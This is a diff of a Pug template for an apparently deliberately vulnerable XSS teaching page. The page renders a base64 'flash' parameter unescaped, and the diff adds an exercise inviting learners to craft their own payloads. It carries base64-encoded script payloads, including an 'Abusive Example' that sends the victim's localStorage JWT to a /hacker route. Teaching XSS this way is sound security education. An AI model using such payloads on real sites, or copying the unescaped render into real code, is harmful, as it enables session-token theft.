@@ -10,7 +10,7 @@ block content
 
       if flash
         .notification.is-danger
-          h1.title.is-2 OMG! You hacked it!
+          h1.title.is-2 Attention!
           p.subtitle.is-2 !{Buffer.from(flash, 'base64')}
       else
         .notification.is-success
@@ -20,7 +20,9 @@ block content
             |  There is one catch, however, to make the flash hackery work, the
             |  developer who made this had to base64 encode the flash message.
             |  He also liked that better. Nicely obfuscated. It looks cool, even:
-            code  http://localhost:3000/unsafe-xss?flash=PHNjcmlwdD53aW5kb3cuYWxlcnQoJ0hlbGxvLCB3b3JsZCEnKTs8L3NjcmlwdD4=
+            = " "
+            code
+              a(href="/unsafe-xss?flash=PHNjcmlwdD53aW5kb3cuYWxlcnQoJ0hlbGxvLCB3b3JsZCEnKTs8L3NjcmlwdD4=") http://localhost:5000/unsafe-xss?flash=PHNjcmlwdD53aW5kb3cuYWxlcnQoJ0hlbGxvLCB3b3JsZCEnKTs8L3NjcmlwdD4=
 
       .content
         h1 Hack the flash
@@ -34,5 +36,9 @@ block content
             strong Naive Example
 
         p
-          a(href="/unsafe-xss?flash=PHNjcmlwdD53aW5kb3cuc2V0VGltZW91dChmdW5jdGlvbigpIHsgd2luZG93LmxvY2F0aW9uPSAnaHR0cDovL2xvY2FsaG9zdDozMDAwL2hhY2tlcj9qYXI9JyArIGxvY2FsU3RvcmFnZS5nZXRJdGVtKCdqd3RUb2tlbicpOyB9LCAxMDAwKTs8L3NjcmlwdD4=")
+          a(href="/unsafe-xss?flash=PHNjcmlwdD53aW5kb3cuc2V0VGltZW91dChmdW5jdGlvbigpIHsgd2luZG93LmxvY2F0aW9uPSAnL2hhY2tlcj9qYXI9JyArIGxvY2FsU3RvcmFnZS5nZXRJdGVtKCdqd3RUb2tlbicpOyB9LCAxMDAwKTs8L3NjcmlwdD4=")
             strong Abusive Example
+
+      .notification
+          p Try to have a go at it yourself! Write a little bit of Javascript and base64 encode it. There are online tools to encode and decode. Start with this simple script and build it out:
+          code= "<script>window.alert('Hello, world!');</script>"
